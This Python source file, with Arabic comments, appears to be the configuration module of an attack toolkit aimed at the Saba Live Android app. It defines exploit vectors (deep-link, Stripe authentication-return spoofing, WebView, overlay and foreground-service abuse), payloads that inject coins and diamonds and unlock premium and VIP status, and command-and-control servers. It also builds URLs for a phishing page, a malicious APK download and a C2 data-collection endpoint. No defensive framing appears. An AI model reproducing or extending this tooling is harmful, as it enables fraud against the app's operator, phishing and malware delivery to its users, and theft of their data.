#!/usr/bin/env python3
# Target Configuration - Updated for Saba Live

import json
import os
import hashlib
from datetime import datetime

class SabaTargetConfig:
    def __init__(self):
        self.config_dir = "config"
        self.targets_file = f"{self.config_dir}/saba_targets.json"
        self.encryption_keys_file = f"{self.config_dir}/encryption_keys.json"
        
        # إنشاء المجلد إذا لم يكن موجوداً
        os.makedirs(self.config_dir, exist_ok=True)
        
    def load_configuration(self):
        """تحميل إعدادات Saba Live"""
        default_config = {
            "primary_target": {
                "app_id": "me.sabachat.live",
                "package_name": "me.sabachat.live",
                "version": "1.2.5",
                "version_code": 33,
                "min_sdk": 21,
                "target_sdk": 36,
                "compile_sdk": 36
            },
            "attack_vectors": {
                "intent_scheme": "saba://voice",
                "stripe_scheme": "stripe-auth://link-accounts/me.sabachat.live",
                "webview_exploit": True,
                "overlay_attack": True,
                "stripe_exploit": True,
                "foreground_service_exploit": True
            },
            "exploit_payloads": {
                "coin_injection": "99999",
                "diamond_injection": "50000",
                "premium_unlock": "true",
                "vip_level": "10"
            },
            "c2_configuration": {
                "primary_server": "https://c2.saba-null.xyz",
                "backup_servers": [
                    "https://backup1.sabanull.xyz",
                    "https://backup2.tor2web.io"
                ],
                "encryption_method": "AES-256-GCM",
                "key_rotation": 3600
            }
        }
        
        try:
            if os.path.exists(self.targets_file):
                with open(self.targets_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            else:
                self.save_configuration(default_config)
                return default_config
                
        except Exception as e:
            print(f"[-] خطأ في تحميل الإعدادات: {e}")
            return default_config
    
    def save_configuration(self, config):
        """حفظ الإعدادات"""
        try:
            with open(self.targets_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
            print(f"[+] تم حفظ الإعدادات في: {self.targets_file}")
            return True
        except Exception as e:
            print(f"[-] خطأ في حفظ الإعدادات: {e}")
            return False
    
    def update_target(self, key, value):
        """تحديث إعدادات الهدف"""
        config = self.load_configuration()
        
        # تحديث عميق للمفتاح
        keys = key.split('.')
        current = config
        for k in keys[:-1]:
            if k not in current:
                current[k] = {}
            current = current[k]
        current[keys[-1]] = value
        
        return self.save_configuration(config)
    
    def generate_encryption_keys(self):
        """توليد مفاتيح التشفير"""
        keys = {
            "aes_key": hashlib.sha256(
                f"SABA_LIVE_{datetime.now().timestamp()}".encode()
            ).hexdigest(),
            "hmac_key": hashlib.sha256(os.urandom(32)).hexdigest(),
            "rsa_public": "",
            "rsa_private": "",
            "generated_at": datetime.now().isoformat(),
            "rotation_schedule": "every_24_hours"
        }
        
        try:
            with open(self.encryption_keys_file, 'w') as f:
                json.dump(keys, f, indent=2)
            print(f"[+] تم توليد مفاتيح التشفير: {self.encryption_keys_file}")
            return keys
        except Exception as e:
            print(f"[-] خطأ في توليد المفاتيح: {e}")
            return None
    
    def get_exploit_urls(self):
        """الحصول على روابط الاستغلال"""
        config = self.load_configuration()
        
        urls = {
            "saba_deeplink": f"{config['attack_vectors']['intent_scheme']}?source=exploit&coins=99999",
            "stripe_exploit": f"{config['attack_vectors']['stripe_scheme']}/authentication_return?success=true",
            "phishing_page": "https://saba-update.com/security",
            "malicious_apk": "https://saba-update.com/update.apk",
            "c2_endpoint": f"{config['c2_configuration']['primary_server']}/collect"
        }
        
        return urls
    
    def validate_configuration(self):
        """التحقق من صحة الإعدادات"""
        config = self.load_configuration()
        
        required_fields = [
            "primary_target.app_id",
            "primary_target.package_name",
            "attack_vectors.intent_scheme",
            "c2_configuration.primary_server"
        ]
        
        missing_fields = []
        
        for field in required_fields:
            keys = field.split('.')
            current = config
            try:
                for k in keys:
                    current = current[k]
            except KeyError:
                missing_fields.append(field)
        
        if missing_fields:
            print(f"[-] حقول مفقودة في الإعدادات: {missing_fields}")
            return False
        
        print("[✓] الإعدادات صالحة وجاهزة للاستخدام")
        return True
    
    def export_for_github(self):
        """تصدير الإعدادات لـ GitHub (بدون بيانات حساسة)"""
        config = self.load_configuration()
        
        # إزالة البيانات الحساسة
        safe_config = {
            "primary_target": config.get("primary_target", {}),
            "attack_vectors": config.get("attack_vectors", {}),
            "exploit_payloads": config.get("exploit_payloads", {})
        }
        
        # إزالة سيرفرات C2 الحقيقية
        if "c2_configuration" in safe_config:
            safe_config["c2_configuration"] = {
                "example_server": "https://example.com",
                "encryption_method": "AES-256-GCM"
            }
        
        export_file = f"{self.config_dir}/saba_config_export.json"
        with open(export_file, 'w', encoding='utf-8') as f:
            json.dump(safe_config, f, indent=2, ensure_ascii=False)
        
        print(f"[+] تم تصدير الإعدادات الآمنة: {export_file}")
        return export_file
